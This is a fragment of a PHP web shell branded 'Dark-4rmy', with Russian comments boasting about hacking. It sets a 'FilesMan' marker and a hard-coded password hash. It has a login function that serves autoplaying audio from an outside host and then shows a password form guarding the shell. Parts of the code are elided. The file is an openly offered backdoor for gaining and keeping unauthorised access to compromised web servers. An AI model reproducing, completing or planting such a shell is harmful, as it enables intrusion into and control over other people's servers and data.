<?php
//-----------------------D--A--R--K--4--R--M--Y-------------------------------------------------
// Если вы хороший хакер, все вас знают. Но если вы великий хакер, никто вас не знает.
// Это не так просто, как кажется другим, и не каждый может это сделать.
//----------------------------------------------------------------------------------------------
$▛ = "71169e38001bcbe946d21d34ab825c2c";
$▘ = true;
$▜ = 'UTF-8';
$▚ = 'FilesMan';
...
$errorMessage = 'Добро пожаловать General x Dark-4rmy @2025';
...
function hardLogin() {
		if(!empty($_SERVER['HTTP_USER_AGENT'])) {
		  ...
		  echo '<audio autoplay src="https://f.top4top.io/m_20526cnoz1.mp3" type="audio/mpeg"></audio>';
		  exit;
		  }
		}
	die("</br></br><pre align=center><form method=post style='font-family:Nunito, sans-serif;color:#1a1a1a; text-shadow: 2px 0 0 #0d52bf, -2px 0 0 #0d52bf, 0 2px 0 #0d52bf, 0 -2px 0 #0d52bf, 1px 1px #0d52bf, -1px -1px 0 #0d52bf, 1px -1px 0 #0d52bf, -1px 1px 0 #0d52bf; text-align: center;'><h3>x_x <br>Welcome Dark-4rmy</h3><br><input placeholder='password' type=password name=pass style='border-radius: 4px 0px 0px 4px; background-color:whitesmoke;border:1px solid #FFF;outline:none;' required><input type=submit name='watching' value='>>' style='height: 20px; border: none; border-radius: 0px 4px 4px 0px;background-color:#0d52bf;color:#fff;cursor:pointer;'></form></pre>
